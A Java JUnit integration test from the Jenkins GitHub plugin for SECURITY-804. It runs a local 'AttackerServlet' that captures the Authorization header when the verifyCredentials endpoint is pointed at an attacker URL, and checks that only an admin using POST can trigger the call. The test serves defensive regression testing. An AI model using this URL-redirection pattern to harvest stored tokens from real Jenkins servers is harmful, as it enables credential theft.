package org.jenkinsci.plugins.github.config;

import com.cloudbees.plugins.credentials.Credentials;
import com.cloudbees.plugins.credentials.CredentialsProvider;
import com.cloudbees.plugins.credentials.CredentialsScope;
import com.cloudbees.plugins.credentials.CredentialsStore;
import com.cloudbees.plugins.credentials.domains.Domain;
import com.gargoylesoftware.htmlunit.HttpMethod;
import com.gargoylesoftware.htmlunit.Page;
import com.gargoylesoftware.htmlunit.WebRequest;
import hudson.security.GlobalMatrixAuthorizationStrategy;
import hudson.util.Secret;
import jenkins.model.Jenkins;
import net.sf.json.JSONObject;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.ServerConnector;
import org.eclipse.jetty.servlet.DefaultServlet;
import org.eclipse.jetty.servlet.ServletContextHandler;
import org.eclipse.jetty.servlet.ServletContextHandler.Context;
import org.eclipse.jetty.servlet.ServletHolder;
import org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl;
import org.junit.After;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.jvnet.hudson.test.For;
import org.jvnet.hudson.test.Issue;
import org.jvnet.hudson.test.JenkinsRule;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.net.URL;
import java.util.HashMap;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.equalTo;
import static org.hamcrest.Matchers.isEmptyOrNullString;
import static org.hamcrest.Matchers.not;

/**
 * Integration counterpart of GitHubServerConfigTest
 */
@For(GitHubServerConfig.class)
public class GitHubServerConfigIntegrationTest {
    
    @Rule
    public JenkinsRule j = new JenkinsRule();
    
    private Server server;
    private AttackerServlet attackerServlet;
    private String attackerUrl;
    
    @Before
    public void setupServer() throws Exception {
        setupAttackerServer();
    }
    
    @After
    public void stopServer() {
        try {
            server.stop();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void setupAttackerServer() throws Exception {
        this.server = new Server();
        ServerConnector serverConnector = new ServerConnector(this.server);
        server.addConnector(serverConnector);
        
        ServletContextHandler context = new ServletContextHandler(ServletContextHandler.NO_SESSIONS);
        context.setContextPath("/*");
        
        this.attackerServlet = new AttackerServlet();
        ServletHolder servletHolder = new ServletHolder(attackerServlet);
        context.addServlet(servletHolder, "/*");
        
        server.setHandler(context);
        
        server.start();
        
        String host = serverConnector.getHost();
        if (host == null) {
            host = "localhost";
        }
        
        this.attackerUrl = "http://" + host + ":" + serverConnector.getLocalPort();
    }
    
    @Test
    @Issue("SECURITY-804")
    public void shouldNotAllow_CredentialsLeakage_usingVerifyCredentials() throws Exception {
        final String credentialId = "cred_id";
        final String secret = "my-secret-access-token";
        
        setupCredentials(credentialId, secret);
        
        final URL url = new URL(
                j.getURL() +
                        "descriptorByName/org.jenkinsci.plugins.github.config.GitHubServerConfig/verifyCredentials?" +
                        "apiUrl=" + attackerUrl + "&credentialsId=" + credentialId
        );
        
        j.jenkins.setCrumbIssuer(null);
        j.jenkins.setSecurityRealm(j.createDummySecurityRealm());

        GlobalMatrixAuthorizationStrategy strategy = new GlobalMatrixAuthorizationStrategy();
        strategy.add(Jenkins.ADMINISTER, "admin");
        strategy.add(Jenkins.READ, "user");
        j.jenkins.setAuthorizationStrategy(strategy);
        
        { // as read-only user
            JenkinsRule.WebClient wc = j.createWebClient();
            wc.getOptions().setThrowExceptionOnFailingStatusCode(false);
            wc.login("user");
            
            Page page = wc.getPage(new WebRequest(url, HttpMethod.POST));
            assertThat(page.getWebResponse().getStatusCode(), equalTo(403));
            
            assertThat(attackerServlet.secretCreds, isEmptyOrNullString());
        }
        { // only admin can verify the credentials
            JenkinsRule.WebClient wc = j.createWebClient();
            wc.getOptions().setThrowExceptionOnFailingStatusCode(false);
            wc.login("admin");
            
            Page page = wc.getPage(new WebRequest(url, HttpMethod.POST));
            assertThat(page.getWebResponse().getStatusCode(), equalTo(200));
            
            assertThat(attackerServlet.secretCreds, not(isEmptyOrNullString()));
            attackerServlet.secretCreds = null;
        }
        {// even admin must use POST
            JenkinsRule.WebClient wc = j.createWebClient();
            wc.getOptions().setThrowExceptionOnFailingStatusCode(false);
            wc.login("admin");
            
            Page page = wc.getPage(new WebRequest(url, HttpMethod.GET));
            assertThat(page.getWebResponse().getStatusCode(), not(equalTo(200)));
            
            assertThat(attackerServlet.secretCreds, isEmptyOrNullString());
        }
    }
    
    private void setupCredentials(String credentialId, String secret) throws Exception {
        CredentialsStore store = CredentialsProvider.lookupStores(j.jenkins).iterator().next();
        // currently not required to follow the UI restriction in terms of path constraint when hitting directly the URL
        Domain domain = Domain.global();
        Credentials credentials = new StringCredentialsImpl(CredentialsScope.GLOBAL, credentialId, "", Secret.fromString(secret));
        store.addCredentials(domain, credentials);
    }
    
    private static class AttackerServlet extends DefaultServlet {
        public String secretCreds;
        
        @Override
        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
            switch (request.getRequestURI()) {
                case "/user":
                    this.onUser(request, response);
                    break;
            }
        }
        
        private void onUser(HttpServletRequest request, HttpServletResponse response) throws IOException {
            secretCreds = request.getHeader("Authorization");
            response.getWriter().write(JSONObject.fromObject(
                    new HashMap<String, Object>() {{
                        put("login", "alice");
                    }}
            ).toString());
        }
    }
}
